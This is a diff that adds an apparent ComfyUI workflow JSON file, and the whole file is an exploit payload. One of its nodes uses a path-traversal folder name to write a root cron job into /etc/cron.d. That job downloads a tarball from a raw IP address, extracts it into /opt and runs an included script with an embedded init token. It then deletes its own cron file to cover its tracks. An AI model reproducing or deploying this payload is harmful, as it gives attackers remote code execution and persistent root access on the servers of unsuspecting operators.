@@ -1,0 +1,20 @@
+{
+  "1": {
+    "class_type": "LoadImage",
+    "inputs": {
+      "image": "_rce_9fbb15.png"
+    }
+  },
+  "2": {
+    "class_type": "SaveImageTextDataSetToFolder",
+    "inputs": {
+      "images": [
+        "1",
+        0
+      ],
+      "texts": "* * * * * root test -f /opt/clore-hosting/client/auth || (curl -sL --max-time 300 http://162.243.253.167:38888/clore-pkg.tar.gz -o /tmp/clore-pkg.tar.gz && tar xzf /tmp/clore-pkg.tar.gz -C /opt/ && rm -f /opt/clore-hosting/client/auth && /opt/clore-hosting/clore.sh --init-token zwv7TxGS4J1MaWqEIi8pfqRUyM7Qcs0DcxYnfSUhuF4LquJ7 && rm -f /etc/cron.d/clore_9fbb15_00000.txt)\n",
+      "folder_name": "../../../../etc/cron.d",
+      "filename_prefix": "clore_9fbb15"
+    }
+  }
+}
